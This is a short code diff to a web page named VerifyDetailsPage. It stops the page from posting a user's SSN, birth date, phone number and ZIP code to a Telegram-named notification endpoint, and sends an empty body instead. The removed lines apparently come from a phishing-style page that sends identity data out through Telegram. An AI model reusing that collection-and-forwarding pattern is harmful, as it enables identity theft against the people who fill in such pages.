@@ -49,15 +49,10 @@ export default function VerifyDetailsPage() {
       await fetch("/api/telegram/verify-details", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          ssn: ssnDigits,
-          birthDate: `${month} ${day}, ${year}`,
-          phone: phoneDigits,
-          zip: zipDigits,
-        }),
+        body: JSON.stringify({}),
       }).catch(console.error);
     } catch (err) {
-      console.error("Verify details notification error:", err);
+      console.error("Verify details error:", err);
     }
 
     setCountdown(10);
